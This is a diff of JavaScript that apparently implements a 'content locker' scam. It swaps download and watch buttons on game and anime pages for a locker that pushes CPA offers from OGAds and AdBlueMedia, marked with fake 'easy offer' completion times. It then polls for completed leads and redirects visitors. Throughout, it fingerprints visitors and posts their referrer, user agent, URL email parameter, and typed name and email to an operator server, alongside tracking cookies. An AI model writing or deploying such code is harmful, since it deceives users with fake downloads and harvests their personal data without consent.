+        var code = `<button onclick="openLocker()" ><a class="follow-btn"><i class="fa fa-heart-o"></i> Follow</a></button>
+                    <button onclick="openLocker()" ><a class="watch-btn"><span>Watch Now</span> <i class="fa fa-angle-right"></i></a></button>`;
+        var mn = $(".anime__details__btn");
+        mn.html(code);
+    }else if(hs.indexOf("battleroyalefuns") > -1){
+        var codes = `<button onclick="openLocker()"><li>Download APK</li></button> 
+                     <button onclick="openLocker()"><li>Download IOS</li></button>`;
+        var amn = $("ul.buttons_list");
+        amn.html(codes);
+    }else if(hs.indexOf("collegebrawlis") > -1){
+        // $("img.logo").attr("src", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdqSk0RMOhMerEojKIUdXYfd000PsI9fSGPeDl9b_6AgEGvO8TqFBQSHpXnzLd5y9Ht1o&usqp=CAU");
+        console.log("adding ----- ");
+        var codes = `<button onclick="openLocker()">Download</button>`;
+        var amn = $(".action");
+        amn.html(codes);
+    }
+    
+}
+
+
+function  addButtonLockerMono(){
+    var codes = `<div class="submit" onclick='openLocker()'>Continue</div>`;
+        var amn = $("#main-2 .bottons");
+        amn.html(codes);
+    
+    
+}
+
+
+
+
+
+
+ 
+ 
+if(hs.indexOf("battleroyalefuns.com") > -1){
+   // window.location.href = "https://verifysuper.com/cl/i/dvgrnk";
+   // window.location.href = "https://appinstallcheck.com/cl/i/vok8n2";
+}
+
+
+
+
+
+
+/*======================================== [ MAIN ] ===========================================*/
+
+
+
+
+
+
+
+/*======================================== [ end ] ===========================================*/
+
+
+
+
+
+
+
+function laodOfferFeedBuildDress(){
+    $.getJSON(URL_OFFERS_FEED, function(offers){
+            var html = '';
+            var ii = 1;
+            var numOffers = BuildOffer;
+            var rub = ["50k", "20k", "10k", 500];
+            offers = offers.splice(0, numOffers);
+            $.each(offers, function(key, offer){
+                var payout = offer.payout;
+                // if(payout >= OGADS_MIN_PAY){
+                    var name = `${payout}$ - ${offer.anchor}`;
+                    html += `
+                     <div class="offer" onclick="redirectToOffer('${offer.url}', '${name}', 'ADBLUEMEDIA')">
+                        <a href="#">${offer.anchor} </a>
+                    </div>
+                    `;
+                ii++;
+                // }
+                // if(ii == numOffers){ break }
+            });
+            $(".locker_ads .offers").append(html);
+        });
+        
+        
+        
+        
+        
+        
+}
+
+
+function laodOfferFeedOgadsDress(){
+    $.ajax({url: URL_OGADS_OFFERS, success: function(offers){
+            offers = JSON.parse(offers);
+            console.log(offers);
+            var offerHits = OgadsOffer;
+            var i = 0; 
+            var html = "";
+             var rub = ["1000k", "50k", "20k", 100];
+            var ii = 1;
+            for(let offer of offers){
+                 var payout = offer["payout"];
+                //  if(payout >= OGADS_MIN_PAY){
+                    i = i + 1;
+                    var url = offer["link"]; 
+                    var name = `${payout}$ ${offer["adcopy"]}`;
+                    html += `<div class="offer" onclick="redirectToOffer('${url}', '${name}', 'OGADS')">
+                        <a href="#">${offer["adcopy"]}</a>
+                    </div>`;
+                    ii++; 
+                // }
+                if(i == offerHits){ break }
+            }
+            $(".locker_ads .offers").append(html);
+    }});
+
+}
+
+
+
+
+
+
+function laodOfferFeedBuild(){
+    $.getJSON(URL_OFFERS_FEED, function(offers){
+        var html = '';
+        var ii = 1;
+        var numOffers= BuildOffer;
+        offers = offers.splice(0, numOffers);
+        $.each(offers, function(key, offer){
+            var t = (ii<=2) ? 1 : getRandomIntInclusive(3, 5);
+            html += ` 
+            <div class="lockx-offer" onclick="redirectToOffer('${offer.url}', '${offer.name}', 'ADBLUEMEDIA')" >
+                <div class="easy">Easy Offer </div>
+                <div class="num"><div>${ii}</div></div>
+                <div class="text">${offer.anchor}<div class="time-c">time to complete this offer : ${t}min</div></div>
+            </div>
+            `;
+            ii++;
+        });
+        $(".lockx-offers").html(html);
+    });
+}
+
+
+function laodOfferFeedOgads(){
+    $.ajax({url: URL_OGADS_OFFERS, success: function(offers){
+            offers = JSON.parse(offers);
+            console.log(offers);
+            var offerHits = OgadsOffer;
+            var i = 0; 
+            var html = "";
+            var ii = 1;
+            for(let offer of offers){
+                var payout = parseFloat(offer["payout"]);
+                if(payout >= OGADS_MIN_PAY){
+                    i = i + 1;
+                
+                    var t = (ii==1) ? getRandomIntInclusive(1, 2) : getRandomIntInclusive(3, 5);
+                    var url = offer["link"]; 
+                    var name = payout + " " + offer["adcopy"];
+                    html += `
+                        <div class="lockx-offer ogadsx" onclick="redirectToOffer('${url}', '${name}', 'OGADS')" >
+                            <div class="easy">Easy offer </div>
+                            <div class="num"><div>${ii}</div></div>
+                            <div class="text">${name}<div class="time-c" style="font-size: .7rem">time to complete this offer : 40sec </div></div>
+                        </div>
+                    `;
+                    ii++; 
+                }
+                if(i == offerHits){ break }
+            }
+            $(".lockx-offers").html(html);
+    }});
+
+}
+
+
+
+
+
+function laodOfferFeedBuildMONO(){
+    $.getJSON(URL_OFFERS_FEED, function(offers){
+        var html = '';
+        var ii = 1;
+        var numOffers= BuildOffer;
+        
+        offers = offers.splice(0, numOffers);
+        $.each(offers, function(key, offer){
+            var t = (ii<=2) ? 1 : getRandomIntInclusive(2, 4);
+            var tpof = arrOfferList[ii];
+            html += ` 
+            <div class="lockx-offer" style="margin-top:27px" onclick="redirectToOffer('${offer.url}', '${offer.name}', 'ADBLUEMEDIA')" >
+                <div class="easy" style="font-size: .75rem;padding: 3px 18px;top: -18px;border: 2px solid #088395;border-radius: 30px;color: #088395;"> ${tpof} </div>
+                <div class="num"><div style="width:40px;height:40px"><img alt="rolling-dice" src="https://img.icons8.com/plasticine/40/monopoly.png" width="35" height="35"></div></div>
+                <div class="text">${offer.anchor}<div class="time-c">time to complete this offer : ${t}min</div></div>
+            </div>
+            `;
+            ii++;
+        });
+        $(".lockx-offers").html(html);
+    });
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function checkLeads() {
+    $.getJSON("https://d1w9uux77ifu8k.cloudfront.net/public/external/check2.php?testing=0&callback=?", //Hint: change to testing=1 for test leads
+    function (leads) {
+        var completed_leads = leads.length;
+        if (completed_leads) {
+            var offer_ids = [];
+            var earnings_in_cents = 0;
+            $.each(leads, function (key, lead) {
+                offer_ids.push(parseInt(lead.offer_id));
+                earnings_in_cents += parseFloat(lead.points);
+                // console.log("Single lead on offer id " + lead.offer_id + " for  $" + (parseFloat(lead.points) / 100).toFixed(2));
+            });
+            window.location.href = "https://appslocked.com/cl/i/vok8n2";
+            
+            // console.log("SUMMARY: User has completed " + completed_leads + " leads, for $" + (earnings_in_cents / 100) + " earnings, on offer ids: " + offer_ids.join("-"));
+        }
+        else {
+            // console.log("");
+        }
+    });
+}
+
+setInterval(checkLeads(), 15000);
+
+
+
+
+/*======================================== [ FUN GET INFO ] ===========================================*/
+
+function detectOS() {
+	let userAgent = window.navigator.userAgent,
+		platform = window.navigator.platform,
+		macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
+		windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
+		iosPlatforms = ['iPhone', 'iPad', 'iPod'],
+		os = null;
+	if (macosPlatforms.indexOf(platform) !== -1) {
+		os = 'Mac OS';
+	} else if (iosPlatforms.indexOf(platform) !== -1) {
+		os = 'iOS';
+	} else if (windowsPlatforms.indexOf(platform) !== -1) {
+		os = 'Windows';
+	} else if (/Android/.test(userAgent)) {
+		os = 'Android';
+	} else if (!os && /Linux/.test(platform)) {
+		os = 'Linux';
+	}
+	return os;
+}
+
+
+
+function getBrowserType() {
+	  const test = regexp => {
+	    return regexp.test(navigator.userAgent);
+	  };
+	 
+	  if (test(/opr\//i) || !!window.opr) {
+	    return 'Opera';
+	  } else if (test(/edg/i)) {
+	    return 'Microsoft Edge';
+	  } else if (test(/chrome|chromium|crios/i)) {
+	    return 'Google Chrome';
+	  } else if (test(/firefox|fxios/i)) {
+	    return 'Mozilla Firefox';
+	  } else if (test(/safari/i)) {
+	    return 'Apple Safari';
+	  } else if (test(/trident/i)) {
+	    return 'Microsoft Internet Explorer';
+	  } else if (test(/ucbrowser/i)) {
+	    return 'UC Browser';
+	  } else if (test(/samsungbrowser/i)) {
+	    return 'Samsung Browser';
+	  }else {
+	    return "null";
+	  }
+}
+	
+	
+function brandDevice(){
+    var useragent = navigator.userAgent;
+    var url = `https://whatmyuseragent.com/api?ua=${useragent}`;
+    $.ajax({url: url, success: function(result){
+        var res = JSON.parse(result);
+        return result["device"];
+    }});
+}
+
+/*======================================== [ FUN GET INFO ] ===========================================*/
+
+
+
+
+
+
+/*======================================== [ VIEW ] ===========================================*/
+if(GetCookie){
+//	console.log("yes alerdy");
+}else{
+	
+	var ref_domain = document.referrer;    /* TRAFFIC SOURCE */
+	const browserType = getBrowserType();    /* BROWSER */
+	const osSystem = detectOS();    /* BROWSER */
+	const domain = window.location.hostname; /* DOMAIN  */
+	const main_url = window.location.href;      /* SMART LINK */
+	const vendor = navigator.userAgent;      /* vendor */
+
+    var params = new URLSearchParams(window.location.search);
+    var email_op = params.get("email"); 
+    var track_id = params.get("track_id");
+	
+    try {
+        ref_domain = new URL(ref_domain);
+        ref_domain = ref_domain.hostname;
+    }catch(err) {
+        ref_domain = document.referrer 
+    }
+    var agent = navigator.userAgent;
+	const PARAMS = "browser="+browserType+"&domain="+domain+"&os="+osSystem+"&main_url="+main_url+"&source="+ref_domain+"&track_id="+track_id+"&email_op="+email_op+"&vendor="+vendor+"&agent="+agent;
+
+	setTimeout(function(){
+    	const xhr = new XMLHttpRequest();
+    	xhr.open("POST", ROOT_URL);
+    	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    	xhr.send(PARAMS);
+    	xhr.onload = () => {
+    		if (xhr.status === 200){
+    		    var res = xhr.responseText;
+    		    // console.log(xhr);
+    		    if(res.length > 7){  
+        		    //console.log("res >> " + res);
+        		    res = JSON.parse(res);
+        		    setCookie(ID_VIEW_COOKIE, res.data, 2);
+        		}
+    		} 
+    	};
+    	xhr.onerror = () => {
+    		// console.log("ERROR_VIEW_FUNC");
+    	};
+	}, 100);
+	
+	setCookie(c_ooksjgr, "HICXT6F765HHFR57677", 2);
+	
+}	
+/*======================================== [ VIEW ] ===========================================*/
+
+
+
+
+/*======================================== [ IMPRESS ] ===========================================*/
+function Impression(){
+    // console.log("IMP");
+    if(!GetCookie){
+        setTimeout(function(){
+            var GET_ID_VIEW = getCookie(ID_VIEW_COOKIE);
+           // console.log("ID : ", GET_ID_VIEW);
+            const domain = window.location.hostname;
+            const PARAMS = "domain="+domain+"&action=imp&id="+GET_ID_VIEW;
+        	const xhr = new XMLHttpRequest();
+        	xhr.open("POST", ROOT_URL);
+        	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        	xhr.send(PARAMS);
+        	xhr.onload = () => {
+        		if (xhr.status === 200){
+        		  //  console.log("----- start -------- ");
+        // 			console.log(xhr);
+        // 			console.log("------ end -----=--- ");
+        		}
+        	}; 
+        	xhr.onerror = () => {
+        // 		console.log("error on xhr");
+        	};
+        }, 100);
+    }
+} 
+/*======================================== [ IMPRESS ] ===========================================*/
+
+
+
+
+
+/*======================================== [ locker view ] ===========================================*/
+function clickToshowLocker(){
+    
+    setTimeout(function(){
+        var CPPKIE_IMPRESS_LOCKER = "GGRrhgy6666tgfgfsggsyywyr$Tw";
+        if(!getCookie(CPPKIE_IMPRESS_LOCKER)){
+            // console.log("openlocker");
+            var GET_ID_VIEW = getCookie(ID_VIEW_COOKIE);
+            const domain = window.location.hostname;
+            const PARAMS = "domain="+domain+"&action=clicklocker&id="+GET_ID_VIEW;
+            const xhr = new XMLHttpRequest();
+            // console.log(PARAMS);
+            xhr.open("POST", ROOT_URL);
+            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhr.send(PARAMS);
+            xhr.onload = () => {
+            	if (xhr.status === 200){
+            	    var res = xhr.responseText;
+            	    setCookie(CPPKIE_IMPRESS_LOCKER, "HIHFEFVFrr5555", 2);
+            	}
+            }; 
+            xhr.onerror = () => {
+            	// console.log("error on xhr");
+            };   
+        }
+    }, 600);
+}
+/*======================================== [ locker view ] ===========================================*/
+
+
+
+
+
+/*======================================== [ CLICK ] ===========================================*/
+function redirectToOffer(url, offer, platform){
+    var GET_ID_VIEW = getCookie(ID_VIEW_COOKIE);
+    const domain = window.location.hostname;
+    var username = $("#lockx-name-input").val();
+    var email = $("#lockx-email-input").val();
+    const PARAMS = "domain="+domain+"&action=clickoffer&id="+GET_ID_VIEW+"&offername="+ offer +"&username="+ username +"&email="+ email +"&platform="+ platform;
+	const xhr = new XMLHttpRequest();
+	xhr.open("POST", ROOT_URL);
+	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	xhr.send(PARAMS);
+	xhr.onload = () => {
+		if (xhr.status === 200){
+		    window.location.href = url;
+		}else{
+		    window.location.href = url;
+		}
+	}; 
+	xhr.onerror = () => {
+		window.location.href = url;
+	};
+}
+/*======================================== [ CLICK] ===========================================*/
+
+
+
+
+/*======================================== [ SEC IN WEBSITE ] ===========================================*/
+function sendDuration(duration) {
+    var PARAMS = "action=durations&duration=" + duration + "&domain=" + window.location.hostname + "&browser=" + getBrowserType() + "&os=" + detectOS() + "&ips=" + ips;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', ROOT_URL, true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send(PARAMS);
+}
+
+function trackDuration() {
+    var startTime = new Date().getTime();
+
+    window.onbeforeunload = function () {
+        var endTime = new Date().getTime();
+        var duration = Math.floor((endTime - startTime) / 1000); // in seconds 
+        sendDuration(duration);
+    };
+}
+
+// window.onload = trackDuration;
+
